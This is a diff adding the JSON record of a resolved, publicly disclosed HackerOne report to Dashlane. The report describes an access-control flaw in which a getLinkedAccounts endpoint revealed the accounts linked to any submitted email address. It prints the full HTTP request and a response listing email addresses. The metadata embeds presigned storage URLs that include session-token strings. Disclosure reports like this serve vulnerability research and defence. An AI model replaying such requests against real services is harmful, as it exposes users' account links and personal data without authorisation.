@@ -1,0 +1,129 @@
+{
+  "id": 152407,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTI0MDc=",
+  "url": "https://hackerone.com/reports/152407",
+  "title": "Missing Access Control(IDOR) To Know LinkedAccounts ",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-07-20T03:39:42.288Z",
+  "submitted_at": "2016-07-20T03:39:42.288Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kiraak-boy",
+    "url": "/kiraak-boy",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/nRMrxtHqTfw8eTSmyikth5MB/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 554,
+    "url": "https://hackerone.com/dashlane",
+    "handle": "dashlane",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/aigzdzSVnRXpu3pVPuYu9JUB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/aigzdzSVnRXpu3pVPuYu9JUB/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Dashlane",
+      "twitter_handle": "dashlane",
+      "website": "https://www.dashlane.com/",
+      "about": "Dashlane provides complete credential security, protecting over 25,000 brands worldwide against the threat of human risk."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-06-26T09:36:27.692Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-05-27T09:36:10.971Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello Team,\n\nWhile Digging your Application I Came to Endpoint Where I Was Able to Check Whether Email is been Used in Multiple Account's or not , And Also Email's Are Getting Leaked .\n\nYou have Feature to Enter Email To get Token :\n\n{F105969} \n\nAs you can see from the above Screenshot , I'm Logged in as (arbaz.owasp@gmail.com) and i put the Email (pentester.owasp@gmail.com) For Getting Code's Which Means I Have Linked my Account into Another Account.\n\n---------------------------------------------------------------------------------------------------------------------------------------\nYour Endpoint Request :\n\nPOST /1/account/getLinkedAccounts HTTP/1.1\nHost: www.dashlane.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.dashlane.com/business/try\nContent-Length: 31\nCookie: \nConnection: close\n\nemail=pentester.owasp@gmail.com\n\n----------------------------------------------------------------------------------------------------------------\nResponse :\n\n{\"code\":200,\"message\":\"OK\",\"content\":{\"logins\":[\"pentester.owasp@gmail.com\",\"arbaz.owasp@gmail.com\",\"hacker.arbaz@gmail.com\"]}}\n\n------------------------------------------------------------------------------------------------------------------\nFrom the Above Response You Can See into Which Which Accounts , Email Have been Linked.  \n \n{F105970}\n\nThanks!\n\nBest,\nArbaz\n",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 105969,
+      "file_name": "idor.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/105/969/98c4d7572d3f67e9096a4147ab29ab12d281f6b5/idor.PNG?response-content-disposition=attachment%3B%20filename%3D%22idor.PNG%22%3B%20filename%2A%3DUTF-8%27%27idor.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4YHF5EHB%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T214301Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIFqNX39T%2FXCJhXUkbTX3lWx8BjPqVE8MnKgEzGKAKedeAh8dx5v6uHPjEk%2BCj1ZBqfgMzv%2FRNtdMS5lgFNUa32GFKrEFCBwQAxoMMDEzNjE5Mjc0ODQ5IgyhgfORnLRqY3GEXbQqjgWHdxllSIT1v7ozL1D563B3s5O9ppME84bDUJGGDi%2FctsJl6PItf3fupoMgly%2BkTvfb2jozfmh9mV82Kqp4iSDMuv3e7FKFmhbLBA6YSKPJdW3rIk6n4KIghj%2BdsH6bsNQuY1JxIlX2ZFqxoftDjH1cH9WWdy5w8azr7yDVYBl09F6ATbB493UmlGzdGQNRvdUgGq8XsJ1lZLvZEXkErLgzZd7SvkL%2FOo82Tqn11F3mw%2BOMSwpTgg8op2AmldjwgJe4CyLZhYriUIvRjGpA9sAnJL0AH9rUE%2BG87yIiPrUndpYtlh1Hvq4JxQ3rGLwxdCy3ScMpdlJqwog9YlWK6SAm4LFTwZybjjWvjU0TbynlPsZHapyntasFH0GrPhe3qHBfMwsFMkbCWFgoqx%2FuShmHW35zishdC6hc1dbVq6V7J4IC%2FNAa40woeXKdsnJDxwMZy3EYYDTuD%2F1Y2dWkmrROK6hhz4BDLx41pApZwDKMYbqdv0jytswxYRDwr%2B9j7Ca%2BO8%2FN4Zx7lWj5L7aDsr1NNuhIRrPGg8zEB8QLYXXV5X6xS%2BSIfRbcm29JOJ7%2Fa8JYhO6oFu4R%2F2oN3I7VRJfNDF5UixB7Zye6Xw8AbS1qEOxkzkypZIIn0f1l%2Bj4IPgf5%2BEnLB8NWzclNpQRclJviZl2aVnzDgB8J9RvFXtJjugsM3YoDeE%2F%2BSzeEtLdTQGy3L8WRXoEr3d15VxuZF2wX9NOiYHtel8GFpxCiGeRXO4oGgd3KT4EuN15tUqoR9ESrzIJ6O0kwAEX%2FU4prAw1u6QqyVOIJqRTdbzbC6jB%2BlkJXSAbA%2BKnhEgq9hDn4CNaHhbmd5yrSXuONjzc%2F%2B9BM6egXoLNPqd0aXIOy5mUwy43BxgY6swHRMbrsLgWKjiiaI7ot7fwXNzz7VF5aCF%2BXCd1qM%2BtvalLfUA6wxzmvlPsK6Uvp8pMk%2Fs8PG1rn4ZcdJ94EDxC0O636Z5A36vcUecw5uqrpX1JABFxT%2Be7Da%2BVq%2FkwnCL%2BQHPDHgJu9ZiHHUim6IRY78Qpu1mi4h3eEA5F7xpCa4MK6cNBtr%2F8mJRiVVhpocrBv%2Bv1aG1CCL60oc6WNadMp4yhkrXtSek0v%2BTAaxXRS08p3%2BQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fff71778363085f63f8789327deb0a85aab9319811b52fbaa73fa21e76ed3910",
+      "file_size": 25385,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 105970,
+      "file_name": "idor1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/105/970/422a084fb302251bfb7bc9b9cbc56bfe8f6c761f/idor1.png?response-content-disposition=attachment%3B%20filename%3D%22idor1.png%22%3B%20filename%2A%3DUTF-8%27%27idor1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4YHF5EHB%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T214301Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIFqNX39T%2FXCJhXUkbTX3lWx8BjPqVE8MnKgEzGKAKedeAh8dx5v6uHPjEk%2BCj1ZBqfgMzv%2FRNtdMS5lgFNUa32GFKrEFCBwQAxoMMDEzNjE5Mjc0ODQ5IgyhgfORnLRqY3GEXbQqjgWHdxllSIT1v7ozL1D563B3s5O9ppME84bDUJGGDi%2FctsJl6PItf3fupoMgly%2BkTvfb2jozfmh9mV82Kqp4iSDMuv3e7FKFmhbLBA6YSKPJdW3rIk6n4KIghj%2BdsH6bsNQuY1JxIlX2ZFqxoftDjH1cH9WWdy5w8azr7yDVYBl09F6ATbB493UmlGzdGQNRvdUgGq8XsJ1lZLvZEXkErLgzZd7SvkL%2FOo82Tqn11F3mw%2BOMSwpTgg8op2AmldjwgJe4CyLZhYriUIvRjGpA9sAnJL0AH9rUE%2BG87yIiPrUndpYtlh1Hvq4JxQ3rGLwxdCy3ScMpdlJqwog9YlWK6SAm4LFTwZybjjWvjU0TbynlPsZHapyntasFH0GrPhe3qHBfMwsFMkbCWFgoqx%2FuShmHW35zishdC6hc1dbVq6V7J4IC%2FNAa40woeXKdsnJDxwMZy3EYYDTuD%2F1Y2dWkmrROK6hhz4BDLx41pApZwDKMYbqdv0jytswxYRDwr%2B9j7Ca%2BO8%2FN4Zx7lWj5L7aDsr1NNuhIRrPGg8zEB8QLYXXV5X6xS%2BSIfRbcm29JOJ7%2Fa8JYhO6oFu4R%2F2oN3I7VRJfNDF5UixB7Zye6Xw8AbS1qEOxkzkypZIIn0f1l%2Bj4IPgf5%2BEnLB8NWzclNpQRclJviZl2aVnzDgB8J9RvFXtJjugsM3YoDeE%2F%2BSzeEtLdTQGy3L8WRXoEr3d15VxuZF2wX9NOiYHtel8GFpxCiGeRXO4oGgd3KT4EuN15tUqoR9ESrzIJ6O0kwAEX%2FU4prAw1u6QqyVOIJqRTdbzbC6jB%2BlkJXSAbA%2BKnhEgq9hDn4CNaHhbmd5yrSXuONjzc%2F%2B9BM6egXoLNPqd0aXIOy5mUwy43BxgY6swHRMbrsLgWKjiiaI7ot7fwXNzz7VF5aCF%2BXCd1qM%2BtvalLfUA6wxzmvlPsK6Uvp8pMk%2Fs8PG1rn4ZcdJ94EDxC0O636Z5A36vcUecw5uqrpX1JABFxT%2Be7Da%2BVq%2FkwnCL%2BQHPDHgJu9ZiHHUim6IRY78Qpu1mi4h3eEA5F7xpCa4MK6cNBtr%2F8mJRiVVhpocrBv%2Bv1aG1CCL60oc6WNadMp4yhkrXtSek0v%2BTAaxXRS08p3%2BQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=da99e3304b2a5927e8b7e2cbca236199850ac48fee721b3d6a22dd67585698fe",
+      "file_size": 58094,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-06-26T09:36:11.023Z",
+  "allow_singular_disclosure_after": -260021210.22623205,
+  "singular_disclosure_allowed": true,
+  "vote_count": 24,
+  "voters": [
+    "thalaivar304",
+    "mpz",
+    "eveeez",
+    "pr0f0x01",
+    "rashedul_css",
+    "securitybreaker",
+    "footstep",
+    "kiraak-boy",
+    "flex0geek",
+    "temmyscript",
+    "and 14 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
